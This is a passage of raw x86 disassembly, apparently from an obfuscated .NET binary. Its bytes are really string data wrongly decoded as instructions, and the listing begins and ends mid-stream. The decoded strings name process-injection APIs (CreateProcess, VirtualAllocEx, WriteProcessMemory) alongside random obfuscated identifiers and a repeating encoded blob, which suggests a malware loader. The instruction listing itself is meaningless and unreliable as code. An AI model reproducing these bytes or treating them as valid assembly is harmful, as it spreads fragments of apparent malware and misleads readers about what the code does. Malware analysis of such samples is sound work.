10003097:	73 78                	jae    0x10003111
10003099:	51                   	push   %ecx
1000309a:	7a 73                	jp     0x1000310f
1000309c:	6e                   	outsb  %ds:(%esi),(%dx)
1000309d:	34 52                	xor    $0x52,%al
1000309f:	43                   	inc    %ebx
100030a0:	58                   	pop    %eax
100030a1:	6b 00 4d             	imul   $0x4d,(%eax),%eax
100030a4:	61                   	popa
100030a5:	72 73                	jb     0x1000311a
100030a7:	68 61 6c 00 55       	push   $0x55006c61
100030ac:	78 43                	js     0x100030f1
100030ae:	72 50                	jb     0x10003100
100030b0:	4a                   	dec    %edx
100030b1:	69 50 56 7a 53 45 65 	imul   $0x6545537a,0x56(%eax),%edx
100030b8:	30 33                	xor    %dh,(%ebx)
100030ba:	6c                   	insb   (%dx),%es:(%edi)
100030bb:	6c                   	insb   (%dx),%es:(%edi)
100030bc:	00 6b 65             	add    %ch,0x65(%ebx)
100030bf:	72 6e                	jb     0x1000312f
100030c1:	65 6c                	gs insb (%dx),%es:(%edi)
100030c3:	33 32                	xor    (%edx),%esi
100030c5:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
100030c8:	6c                   	insb   (%dx),%es:(%edi)
100030c9:	00 48 75             	add    %cl,0x75(%eax)
100030cc:	45                   	inc    %ebp
100030cd:	61                   	popa
100030ce:	4a                   	dec    %edx
100030cf:	4d                   	dec    %ebp
100030d0:	5a                   	pop    %edx
100030d1:	59                   	pop    %ecx
100030d2:	53                   	push   %ebx
100030d3:	48                   	dec    %eax
100030d4:	73 6b                	jae    0x10003141
100030d6:	59                   	pop    %ecx
100030d7:	45                   	inc    %ebp
100030d8:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
100030db:	6c                   	insb   (%dx),%es:(%edi)
100030dc:	00 4b 69             	add    %cl,0x69(%ebx)
100030df:	6c                   	insb   (%dx),%es:(%edi)
100030e0:	6c                   	insb   (%dx),%es:(%edi)
100030e1:	00 53 79             	add    %dl,0x79(%ebx)
100030e4:	73 74                	jae    0x1000315a
100030e6:	65 6d                	gs insl (%dx),%es:(%edi)
100030e8:	00 52 61             	add    %dl,0x61(%edx)
100030eb:	6e                   	outsb  %ds:(%esi),(%dx)
100030ec:	64 6f                	outsl  %fs:(%esi),(%dx)
100030ee:	6d                   	insl   (%dx),%es:(%edi)
100030ef:	00 47 65             	add    %al,0x65(%edi)
100030f2:	74 46                	je     0x1000313a
100030f4:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
100030fb:	57 
100030fc:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
10003103:	78 
10003104:	74 65                	je     0x1000316b
10003106:	6e                   	outsb  %ds:(%esi),(%dx)
10003107:	73 69                	jae    0x10003172
10003109:	6f                   	outsl  %ds:(%esi),(%dx)
1000310a:	6e                   	outsb  %ds:(%esi),(%dx)
1000310b:	00 53 79             	add    %dl,0x79(%ebx)
1000310e:	73 74                	jae    0x10003184
10003110:	65 6d                	gs insl (%dx),%es:(%edi)
10003112:	2e 52                	cs push %edx
10003114:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
10003117:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
1000311c:	6e                   	outsb  %ds:(%esi),(%dx)
1000311d:	00 53 65             	add    %dl,0x65(%ebx)
10003120:	61                   	popa
10003121:	72 63                	jb     0x10003186
10003123:	68 4f 70 74 69       	push   $0x6974704f
10003128:	6f                   	outsl  %ds:(%esi),(%dx)
10003129:	6e                   	outsb  %ds:(%esi),(%dx)
1000312a:	00 45 78             	add    %al,0x78(%ebp)
1000312d:	63 65 70             	arpl   %esp,0x70(%ebp)
10003130:	74 69                	je     0x1000319b
10003132:	6f                   	outsl  %ds:(%esi),(%dx)
10003133:	6e                   	outsb  %ds:(%esi),(%dx)
10003134:	00 43 75             	add    %al,0x75(%ebx)
10003137:	64 75 72             	fs jne 0x100031ac
1000313a:	62 30                	bound  %esi,(%eax)
1000313c:	6b 69 52 41          	imul   $0x41,0x52(%ecx),%ebp
10003140:	73 61                	jae    0x100031a3
10003142:	4f                   	dec    %edi
10003143:	6f                   	outsl  %ds:(%esi),(%dx)
10003144:	00 5a 65             	add    %bl,0x65(%edx)
10003147:	72 6f                	jb     0x100031b8
10003149:	00 53 6c             	add    %dl,0x6c(%ebx)
1000314c:	65 65 70 00          	gs gs jo 0x10003150
10003150:	49                   	dec    %ecx
10003151:	66 46                	inc    %si
10003153:	5a                   	pop    %edx
10003154:	4b                   	dec    %ebx
10003155:	49                   	dec    %ecx
10003156:	5a                   	pop    %edx
10003157:	65 42                	gs inc %edx
10003159:	44                   	inc    %esp
1000315a:	75 77                	jne    0x100031d3
1000315c:	46                   	inc    %esi
1000315d:	64 4c                	fs dec %esp
1000315f:	6c                   	insb   (%dx),%es:(%edi)
10003160:	70 00                	jo     0x10003162
10003162:	53                   	push   %ebx
10003163:	79 73                	jns    0x100031d8
10003165:	74 65                	je     0x100031cc
10003167:	6d                   	insl   (%dx),%es:(%edi)
10003168:	2e 4c                	cs dec %esp
1000316a:	69 6e 71 00 4f 55 6c 	imul   $0x6c554f00,0x71(%esi),%ebp
10003171:	72 66                	jb     0x100031d9
10003173:	79 70                	jns    0x100031e5
10003175:	68 41 65 79 59       	push   $0x59796541
1000317a:	49                   	dec    %ecx
1000317b:	57                   	push   %edi
1000317c:	72 00                	jb     0x1000317e
1000317e:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
10003183:	00 49 6e             	add    %cl,0x6e(%ecx)
10003186:	74 50                	je     0x100031d8
10003188:	74 72                	je     0x100031fc
1000318a:	00 53 79             	add    %dl,0x79(%ebx)
1000318d:	73 74                	jae    0x10003203
1000318f:	65 6d                	gs insl (%dx),%es:(%edi)
10003191:	2e 44                	cs inc %esp
10003193:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
1000319a:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
100031a1:	74 65                	je     0x10003208
100031a3:	6d                   	insl   (%dx),%es:(%edi)
100031a4:	2e 52                	cs push %edx
100031a6:	75 6e                	jne    0x10003216
100031a8:	74 69                	je     0x10003213
100031aa:	6d                   	insl   (%dx),%es:(%edi)
100031ab:	65 2e 49             	gs cs dec %ecx
100031ae:	6e                   	outsb  %ds:(%esi),(%dx)
100031af:	74 65                	je     0x10003216
100031b1:	72 6f                	jb     0x10003222
100031b3:	70 53                	jo     0x10003208
100031b5:	65 72 76             	gs jb  0x1000322e
100031b8:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
100031bf:	73 74                	jae    0x10003235
100031c1:	65 6d                	gs insl (%dx),%es:(%edi)
100031c3:	2e 52                	cs push %edx
100031c5:	75 6e                	jne    0x10003235
100031c7:	74 69                	je     0x10003232
100031c9:	6d                   	insl   (%dx),%es:(%edi)
100031ca:	65 2e 43             	gs cs inc %ebx
100031cd:	6f                   	outsl  %ds:(%esi),(%dx)
100031ce:	6d                   	insl   (%dx),%es:(%edi)
100031cf:	70 69                	jo     0x1000323a
100031d1:	6c                   	insb   (%dx),%es:(%edi)
100031d2:	65 72 53             	gs jb  0x10003228
100031d5:	65 72 76             	gs jb  0x1000324e
100031d8:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
100031df:	62 75 67             	bound  %esi,0x67(%ebp)
100031e2:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
100031e9:	65 
100031ea:	73 00                	jae    0x100031ec
100031ec:	47                   	inc    %edi
100031ed:	75 41                	jne    0x10003230
100031ef:	56                   	push   %esi
100031f0:	64 74 47             	fs je  0x1000323a
100031f3:	5a                   	pop    %edx
100031f4:	35 71 4a 75 68       	xor    $0x68754a71,%eax
100031f9:	31 55 7a             	xor    %edx,0x7a(%ebp)
100031fc:	4b                   	dec    %ebx
100031fd:	4b                   	dec    %ebx
100031fe:	6e                   	outsb  %ds:(%esi),(%dx)
100031ff:	6a 65                	push   $0x65
10003201:	73 00                	jae    0x10003203
10003203:	47                   	inc    %edi
10003204:	65 74 46             	gs je  0x1000324d
10003207:	69 6c 65 73 00 43 6f 	imul   $0x6e6f4300,0x73(%ebp,%eiz,2),%ebp
1000320e:	6e 
1000320f:	74 61                	je     0x10003272
10003211:	69 6e 73 00 43 72 65 	imul   $0x65724300,0x73(%esi),%ebp
10003218:	61                   	popa
10003219:	74 65                	je     0x10003280
1000321b:	50                   	push   %eax
1000321c:	72 6f                	jb     0x1000328d
1000321e:	63 65 73             	arpl   %esp,0x73(%ebp)
10003221:	73 00                	jae    0x10003223
10003223:	4e                   	dec    %esi
10003224:	6e                   	outsb  %ds:(%esi),(%dx)
10003225:	46                   	inc    %esi
10003226:	5a                   	pop    %edx
10003227:	4a                   	dec    %edx
10003228:	77 73                	ja     0x1000329d
1000322a:	72 46                	jb     0x10003272
1000322c:	68 4b 7a 58 74       	push   $0x74587a4b
10003231:	00 4f 62             	add    %cl,0x62(%edi)
10003234:	6a 65                	push   $0x65
10003236:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
1000323a:	6f                   	outsl  %ds:(%esi),(%dx)
1000323b:	6e                   	outsb  %ds:(%esi),(%dx)
1000323c:	76 65                	jbe    0x100032a3
1000323e:	72 74                	jb     0x100032b4
10003240:	00 4e 65             	add    %cl,0x65(%esi)
10003243:	78 74                	js     0x100032b9
10003245:	00 53 79             	add    %dl,0x79(%ebx)
10003248:	73 74                	jae    0x100032be
1000324a:	65 6d                	gs insl (%dx),%es:(%edi)
1000324c:	2e 54                	cs push %esp
1000324e:	65 78 74             	gs js  0x100032c5
10003251:	00 53 4d             	add    %dl,0x4d(%ebx)
10003254:	4e                   	dec    %esi
10003255:	75 4e                	jne    0x100032a5
10003257:	4b                   	dec    %ebx
10003258:	72 5a                	jb     0x100032b4
1000325a:	41                   	inc    %ecx
1000325b:	62 66 6a             	bound  %esp,0x6a(%esi)
1000325e:	50                   	push   %eax
1000325f:	73 63                	jae    0x100032c4
10003261:	55                   	push   %ebp
10003262:	72 77                	jb     0x100032db
10003264:	00 4f 4b             	add    %cl,0x4b(%edi)
10003267:	72 4f                	jb     0x100032b8
10003269:	63 4f 57             	arpl   %ecx,0x57(%edi)
1000326c:	6e                   	outsb  %ds:(%esi),(%dx)
1000326d:	78 77                	js     0x100032e6
1000326f:	58                   	pop    %eax
10003270:	30 4f 59             	xor    %cl,0x59(%edi)
10003273:	45                   	inc    %ebp
10003274:	78 00                	js     0x10003276
10003276:	56                   	push   %esi
10003277:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
1000327e:	6c                   	insb   (%dx),%es:(%edi)
1000327f:	6c                   	insb   (%dx),%es:(%edi)
10003280:	6f                   	outsl  %ds:(%esi),(%dx)
10003281:	63 45 78             	arpl   %eax,0x78(%ebp)
10003284:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
10003288:	72 72                	jb     0x100032fc
1000328a:	61                   	popa
1000328b:	79 00                	jns    0x1000328d
1000328d:	57                   	push   %edi
1000328e:	72 69                	jb     0x100032f9
10003290:	74 65                	je     0x100032f7
10003292:	50                   	push   %eax
10003293:	72 6f                	jb     0x10003304
10003295:	63 65 73             	arpl   %esp,0x73(%ebp)
10003298:	73 4d                	jae    0x100032e7
1000329a:	65 6d                	gs insl (%dx),%es:(%edi)
1000329c:	6f                   	outsl  %ds:(%esi),(%dx)
1000329d:	72 79                	jb     0x10003318
1000329f:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
100032a3:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
100032a8:	79 00                	jns    0x100032aa
100032aa:	6f                   	outsl  %ds:(%esi),(%dx)
100032ab:	70 5f                	jo     0x1000330c
100032ad:	45                   	inc    %ebp
100032ae:	71 75                	jno    0x10003325
100032b0:	61                   	popa
100032b1:	6c                   	insb   (%dx),%es:(%edi)
100032b2:	69 74 79 00 47 72 6e 	imul   $0x496e7247,0x0(%ecx,%edi,2),%esi
100032b9:	49 
100032ba:	65 4d                	gs dec %ebp
100032bc:	53                   	push   %ebx
100032bd:	45                   	inc    %ebp
100032be:	4b                   	dec    %ebx
100032bf:	66 6b 56 75 7a       	imul   $0x7a,0x75(%esi),%dx
100032c4:	00 00                	add    %al,(%eax)
100032c6:	00 00                	add    %al,(%eax)
100032c8:	00 84 d1 5a 00 30 00 	add    %al,0x30005a(%ecx,%edx,8)
100032cf:	70 00                	jo     0x100032d1
100032d1:	71 00                	jno    0x100032d3
100032d3:	61                   	popa
100032d4:	00 6b 00             	add    %ch,0x0(%ebx)
100032d7:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
100032dc:	00 32                	add    %dh,(%edx)
100032de:	00 5a 00             	add    %bl,0x0(%edx)
100032e1:	35 00 52 00 6c       	xor    $0x6c005200,%eax
100032e6:	00 4a 00             	add    %cl,0x0(%edx)
100032e9:	74 00                	je     0x100032eb
100032eb:	52                   	push   %edx
100032ec:	00 6d 00             	add    %ch,0x0(%ebp)
100032ef:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
100032f3:	61                   	popa
100032f4:	00 6d 00             	add    %ch,0x0(%ebp)
100032f7:	70 00                	jo     0x100032f9
100032f9:	4f                   	dec    %edi
100032fa:	00 63 00             	add    %ah,0x0(%ebx)
100032fd:	7a 00                	jp     0x100032ff
100032ff:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003303:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
10003307:	5a                   	pop    %edx
10003308:	00 6e 00             	add    %ch,0x0(%esi)
1000330b:	53                   	push   %ebx
1000330c:	00 6d 00             	add    %ch,0x0(%ebp)
1000330f:	70 00                	jo     0x10003311
10003311:	71 00                	jno    0x10003313
10003313:	54                   	push   %esp
10003314:	00 6e 00             	add    %ch,0x0(%esi)
10003317:	4d                   	dec    %ebp
10003318:	00 33                	add    %dh,(%ebx)
1000331a:	00 5a 00             	add    %bl,0x0(%edx)
1000331d:	6e                   	outsb  %ds:(%esi),(%dx)
1000331e:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
10003322:	00 63 00             	add    %ah,0x0(%ebx)
10003325:	47                   	inc    %edi
10003326:	00 4a 00             	add    %cl,0x0(%edx)
10003329:	48                   	dec    %eax
1000332a:	00 5a 00             	add    %bl,0x0(%edx)
1000332d:	30 00                	xor    %al,(%eax)
1000332f:	70 00                	jo     0x10003331
10003331:	71 00                	jno    0x10003333
10003333:	61                   	popa
10003334:	00 6b 00             	add    %ch,0x0(%ebx)
10003337:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
1000333c:	00 32                	add    %dh,(%edx)
1000333e:	00 5a 00             	add    %bl,0x0(%edx)
10003341:	35 00 52 00 6d       	xor    $0x6d005200,%eax
10003346:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
1000334a:	00 61 00             	add    %ah,0x0(%ecx)
1000334d:	6d                   	insl   (%dx),%es:(%edi)
1000334e:	00 70 00             	add    %dh,0x0(%eax)
10003351:	4f                   	dec    %edi
10003352:	00 63 00             	add    %ah,0x0(%ebx)
10003355:	7a 00                	jp     0x10003357
10003357:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
1000335b:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
1000335f:	5a                   	pop    %edx
10003360:	00 57 00             	add    %dl,0x0(%edi)
10003363:	61                   	popa
10003364:	00 30                	add    %dh,(%eax)
10003366:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
1000336a:	00 53 00             	add    %dl,0x0(%ebx)
1000336d:	6d                   	insl   (%dx),%es:(%edi)
1000336e:	00 70 00             	add    %dh,0x0(%eax)
10003371:	71 00                	jno    0x10003373
10003373:	54                   	push   %esp
10003374:	00 6e 00             	add    %ch,0x0(%esi)
10003377:	4d                   	dec    %ebp
10003378:	00 33                	add    %dh,(%ebx)
1000337a:	00 5a 00             	add    %bl,0x0(%edx)
1000337d:	6e                   	outsb  %ds:(%esi),(%dx)
1000337e:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
10003382:	00 5a 00             	add    %bl,0x0(%edx)
10003385:	30 00                	xor    %al,(%eax)
10003387:	70 00                	jo     0x10003389
10003389:	71 00                	jno    0x1000338b
1000338b:	61                   	popa
1000338c:	00 6b 00             	add    %ch,0x0(%ebx)
1000338f:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
10003394:	00 32                	add    %dh,(%edx)
10003396:	00 5a 00             	add    %bl,0x0(%edx)
10003399:	35 00 52 00 6b       	xor    $0x6b005200,%eax
1000339e:	00 68 00             	add    %ch,0x0(%eax)
100033a1:	53                   	push   %ebx
100033a2:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
100033a6:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
100033aa:	00 61 00             	add    %ah,0x0(%ecx)
100033ad:	6d                   	insl   (%dx),%es:(%edi)
100033ae:	00 70 00             	add    %dh,0x0(%eax)
100033b1:	4f                   	dec    %edi
100033b2:	00 63 00             	add    %ah,0x0(%ebx)
100033b5:	7a 00                	jp     0x100033b7
100033b7:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100033bb:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
100033bf:	5a                   	pop    %edx
100033c0:	00 6e 00             	add    %ch,0x0(%esi)
100033c3:	53                   	push   %ebx
100033c4:	00 6d 00             	add    %ch,0x0(%ebp)
100033c7:	70 00                	jo     0x100033c9
100033c9:	71 00                	jno    0x100033cb
100033cb:	54                   	push   %esp
100033cc:	00 6e 00             	add    %ch,0x0(%esi)
100033cf:	4d                   	dec    %ebp
100033d0:	00 33                	add    %dh,(%ebx)
100033d2:	00 5a 00             	add    %bl,0x0(%edx)
100033d5:	6e                   	outsb  %ds:(%esi),(%dx)
100033d6:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
100033da:	00 53 00             	add    %dl,0x0(%ebx)
100033dd:	55                   	push   %ebp
100033de:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
100033e2:	00 5a 00             	add    %bl,0x0(%edx)
100033e5:	30 00                	xor    %al,(%eax)
100033e7:	70 00                	jo     0x100033e9
100033e9:	71 00                	jno    0x100033eb
100033eb:	61                   	popa
100033ec:	00 6b 00             	add    %ch,0x0(%ebx)
100033ef:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
100033f4:	00 32                	add    %dh,(%edx)
100033f6:	00 5a 00             	add    %bl,0x0(%edx)
100033f9:	35 00 52 00 6d       	xor    $0x6d005200,%eax
100033fe:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
10003402:	00 61 00             	add    %ah,0x0(%ecx)
10003405:	6d                   	insl   (%dx),%es:(%edi)
10003406:	00 70 00             	add    %dh,0x0(%eax)
10003409:	4f                   	dec    %edi
1000340a:	00 63 00             	add    %ah,0x0(%ebx)
1000340d:	7a 00                	jp     0x1000340f
1000340f:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003413:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
10003417:	5a                   	pop    %edx
10003418:	00 7a 00             	add    %bh,0x0(%edx)
1000341b:	59                   	pop    %ecx
1000341c:	00 6b 00             	add    %ch,0x0(%ebx)
1000341f:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10003423:	53                   	push   %ebx
10003424:	00 6d 00             	add    %ch,0x0(%ebp)
10003427:	70 00                	jo     0x10003429
10003429:	71 00                	jno    0x1000342b
1000342b:	54                   	push   %esp
1000342c:	00 6e 00             	add    %ch,0x0(%esi)
1000342f:	4d                   	dec    %ebp
10003430:	00 33                	add    %dh,(%ebx)
10003432:	00 5a 00             	add    %bl,0x0(%edx)
10003435:	6e                   	outsb  %ds:(%esi),(%dx)
10003436:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
1000343a:	00 5a 00             	add    %bl,0x0(%edx)
1000343d:	30 00                	xor    %al,(%eax)
1000343f:	70 00                	jo     0x10003441
10003441:	71 00                	jno    0x10003443
10003443:	61                   	popa
10003444:	00 6b 00             	add    %ch,0x0(%ebx)
10003447:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
1000344c:	00 32                	add    %dh,(%edx)
1000344e:	00 5a 00             	add    %bl,0x0(%edx)
10003451:	35 00 52 00 6a       	xor    $0x6a005200,%eax
10003456:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
1000345a:	00 57 00             	add    %dl,0x0(%edi)
1000345d:	57                   	push   %edi
1000345e:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
10003462:	00 61 00             	add    %ah,0x0(%ecx)
10003465:	6d                   	insl   (%dx),%es:(%edi)
10003466:	00 70 00             	add    %dh,0x0(%eax)
10003469:	4f                   	dec    %edi
1000346a:	00 63 00             	add    %ah,0x0(%ebx)
1000346d:	7a 00                	jp     0x1000346f
1000346f:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003473:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
10003477:	5a                   	pop    %edx
10003478:	00 6e 00             	add    %ch,0x0(%esi)
1000347b:	53                   	push   %ebx
1000347c:	00 6d 00             	add    %ch,0x0(%ebp)
1000347f:	70 00                	jo     0x10003481
10003481:	71 00                	jno    0x10003483
10003483:	54                   	push   %esp
10003484:	00 6e 00             	add    %ch,0x0(%esi)
10003487:	4d                   	dec    %ebp
10003488:	00 33                	add    %dh,(%ebx)
1000348a:	00 5a 00             	add    %bl,0x0(%edx)
1000348d:	6e                   	outsb  %ds:(%esi),(%dx)
1000348e:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
10003492:	00 57 00             	add    %dl,0x0(%edi)
10003495:	46                   	inc    %esi
10003496:	00 4a 00             	add    %cl,0x0(%edx)
10003499:	73 00                	jae    0x1000349b
1000349b:	5a                   	pop    %edx
1000349c:	00 30                	add    %dh,(%eax)
1000349e:	00 70 00             	add    %dh,0x0(%eax)
100034a1:	71 00                	jno    0x100034a3
100034a3:	61                   	popa
100034a4:	00 6b 00             	add    %ch,0x0(%ebx)
100034a7:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
100034ac:	00 32                	add    %dh,(%edx)
100034ae:	00 5a 00             	add    %bl,0x0(%edx)
100034b1:	35 00 52 00 6d       	xor    $0x6d005200,%eax
100034b6:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
100034ba:	00 61 00             	add    %ah,0x0(%ecx)
100034bd:	6d                   	insl   (%dx),%es:(%edi)
100034be:	00 70 00             	add    %dh,0x0(%eax)
100034c1:	4f                   	dec    %edi
100034c2:	00 63 00             	add    %ah,0x0(%ebx)
100034c5:	7a 00                	jp     0x100034c7
100034c7:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100034cb:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
100034cf:	5a                   	pop    %edx
100034d0:	00 4a 00             	add    %cl,0x0(%edx)
100034d3:	52                   	push   %edx
100034d4:	00 7a 00             	add    %bh,0x0(%edx)
100034d7:	46                   	inc    %esi
100034d8:	00 6e 00             	add    %ch,0x0(%esi)
100034db:	53                   	push   %ebx
100034dc:	00 6d 00             	add    %ch,0x0(%ebp)
100034df:	70 00                	jo     0x100034e1
100034e1:	71 00                	jno    0x100034e3
100034e3:	54                   	push   %esp
100034e4:	00 6e 00             	add    %ch,0x0(%esi)
100034e7:	4d                   	dec    %ebp
100034e8:	00 33                	add    %dh,(%ebx)
100034ea:	00 5a 00             	add    %bl,0x0(%edx)
100034ed:	6e                   	outsb  %ds:(%esi),(%dx)
100034ee:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
100034f2:	00 5a 00             	add    %bl,0x0(%edx)
100034f5:	30 00                	xor    %al,(%eax)
100034f7:	70 00                	jo     0x100034f9
100034f9:	71 00                	jno    0x100034fb
100034fb:	61                   	popa
100034fc:	00 6b 00             	add    %ch,0x0(%ebx)
100034ff:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
10003504:	00 32                	add    %dh,(%edx)
10003506:	00 5a 00             	add    %bl,0x0(%edx)
10003509:	35 00 52 00 6d       	xor    $0x6d005200,%eax
1000350e:	00 78 00             	add    %bh,0x0(%eax)
10003511:	69 00 56 00 32 00    	imul   $0x320056,(%eax),%eax
10003517:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
1000351b:	61                   	popa
1000351c:	00 6d 00             	add    %ch,0x0(%ebp)
1000351f:	70 00                	jo     0x10003521
10003521:	4f                   	dec    %edi
10003522:	00 63 00             	add    %ah,0x0(%ebx)
10003525:	7a 00                	jp     0x10003527
10003527:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
1000352b:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
1000352f:	5a                   	pop    %edx
10003530:	00 6e 00             	add    %ch,0x0(%esi)
10003533:	53                   	push   %ebx
10003534:	00 6d 00             	add    %ch,0x0(%ebp)
10003537:	70 00                	jo     0x10003539
10003539:	71 00                	jno    0x1000353b
1000353b:	54                   	push   %esp
1000353c:	00 6e 00             	add    %ch,0x0(%esi)
1000353f:	4d                   	dec    %ebp
10003540:	00 33                	add    %dh,(%ebx)
10003542:	00 5a 00             	add    %bl,0x0(%edx)
10003545:	6e                   	outsb  %ds:(%esi),(%dx)
10003546:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
1000354a:	00 4f 00             	add    %cl,0x0(%edi)
1000354d:	58                   	pop    %eax
1000354e:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
10003552:	00 5a 00             	add    %bl,0x0(%edx)
10003555:	30 00                	xor    %al,(%eax)
10003557:	70 00                	jo     0x10003559
10003559:	71 00                	jno    0x1000355b
1000355b:	61                   	popa
1000355c:	00 6b 00             	add    %ch,0x0(%ebx)
1000355f:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
10003564:	00 32                	add    %dh,(%edx)
10003566:	00 5a 00             	add    %bl,0x0(%edx)
10003569:	35 00 52 00 6d       	xor    $0x6d005200,%eax
1000356e:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
10003572:	00 61 00             	add    %ah,0x0(%ecx)
10003575:	6d                   	insl   (%dx),%es:(%edi)
10003576:	00 70 00             	add    %dh,0x0(%eax)
10003579:	4f                   	dec    %edi
1000357a:	00 63 00             	add    %ah,0x0(%ebx)
1000357d:	7a 00                	jp     0x1000357f
1000357f:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003583:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
10003587:	5a                   	pop    %edx
10003588:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
1000358c:	00 6e 00             	add    %ch,0x0(%esi)
1000358f:	42                   	inc    %edx
10003590:	00 6e 00             	add    %ch,0x0(%esi)
10003593:	53                   	push   %ebx
10003594:	00 6d 00             	add    %ch,0x0(%ebp)
10003597:	70 00                	jo     0x10003599
10003599:	71 00                	jno    0x1000359b
1000359b:	54                   	push   %esp
1000359c:	00 6e 00             	add    %ch,0x0(%esi)
1000359f:	4d                   	dec    %ebp
100035a0:	00 33                	add    %dh,(%ebx)
100035a2:	00 5a 00             	add    %bl,0x0(%edx)
100035a5:	6e                   	outsb  %ds:(%esi),(%dx)
100035a6:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
100035aa:	00 5a 00             	add    %bl,0x0(%edx)
100035ad:	30 00                	xor    %al,(%eax)
100035af:	70 00                	jo     0x100035b1
100035b1:	71 00                	jno    0x100035b3
100035b3:	61                   	popa
100035b4:	00 6b 00             	add    %ch,0x0(%ebx)
100035b7:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
100035bc:	00 32                	add    %dh,(%edx)
100035be:	00 5a 00             	add    %bl,0x0(%edx)
100035c1:	35 00 52 00 6d       	xor    $0x6d005200,%eax
100035c6:	00 4a 00             	add    %cl,0x0(%edx)
100035c9:	70 00                	jo     0x100035cb
100035cb:	51                   	push   %ecx
100035cc:	00 6d 00             	add    %ch,0x0(%ebp)
100035cf:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
100035d3:	61                   	popa
100035d4:	00 6d 00             	add    %ch,0x0(%ebp)
100035d7:	70 00                	jo     0x100035d9
100035d9:	4f                   	dec    %edi
100035da:	00 63 00             	add    %ah,0x0(%ebx)
100035dd:	7a 00                	jp     0x100035df
100035df:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100035e3:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
100035e7:	5a                   	pop    %edx
100035e8:	00 6e 00             	add    %ch,0x0(%esi)
100035eb:	53                   	push   %ebx
100035ec:	00 6d 00             	add    %ch,0x0(%ebp)
100035ef:	70 00                	jo     0x100035f1
100035f1:	71 00                	jno    0x100035f3
100035f3:	54                   	push   %esp
100035f4:	00 6e 00             	add    %ch,0x0(%esi)
100035f7:	4d                   	dec    %ebp
100035f8:	00 33                	add    %dh,(%ebx)
100035fa:	00 5a 00             	add    %bl,0x0(%edx)
100035fd:	6e                   	outsb  %ds:(%esi),(%dx)
100035fe:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
10003602:	00 4d 00             	add    %cl,0x0(%ebp)
10003605:	46                   	inc    %esi
10003606:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
1000360a:	00 5a 00             	add    %bl,0x0(%edx)
1000360d:	30 00                	xor    %al,(%eax)
1000360f:	70 00                	jo     0x10003611
10003611:	71 00                	jno    0x10003613
10003613:	61                   	popa
10003614:	00 6b 00             	add    %ch,0x0(%ebx)
10003617:	35 00 7a 00 4e       	xor    $0x4e007a00,%eax
